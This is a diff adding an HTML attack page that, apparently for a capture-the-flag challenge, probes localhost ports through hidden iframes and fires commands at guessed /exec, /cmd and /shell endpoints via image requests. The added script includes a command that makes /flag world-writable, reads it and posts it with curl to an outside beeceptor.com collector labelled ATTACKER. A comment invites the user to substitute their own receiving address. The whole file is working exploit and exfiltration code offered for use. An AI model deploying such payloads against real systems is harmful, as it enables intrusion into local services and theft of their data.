@@ -1,4 +1,30 @@
-<!doctype html>
+<!DOCTYPE html>
 <script>
-fetch("https://1213123.free.beeceptor.com/?ts=" + Date.now(), {mode: "no-cors"});
+const ATTACKER = "https://1213123.free.beeceptor.com"; // 改成你的接收地址
+const PORTS = [3000, 5000, 8080, 8888, 9000];
+const PATHS = ["/exec", "/cmd", "/shell", "/api/exec"];
+
+function fire(url, cmd) {
+    let img = new Image();
+    img.src = url + (url.includes('?') ? '&' : '?') + 'cmd=' + encodeURIComponent(cmd);
+}
+
+function exploit(port, path) {
+    const cmd = `chmod 777 /flag && cat /flag | curl -X POST -d @- ${ATTACKER}/flag`;
+    fire(`http://localhost:${port}${path}`, cmd);
+}
+
+for (let port of PORTS) {
+    let iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = `http://localhost:${port}/`;
+    iframe.onload = () => {
+        for (let path of PATHS) {
+            fire(`http://localhost:${port}${path}`, `curl ${ATTACKER}/ping?p=${port}&h=${path}`);
+            setTimeout(() => exploit(port, path), 2000);
+        }
+    };
+    document.body.appendChild(iframe);
+    setTimeout(() => iframe.remove(), 3000);
+}
 </script>
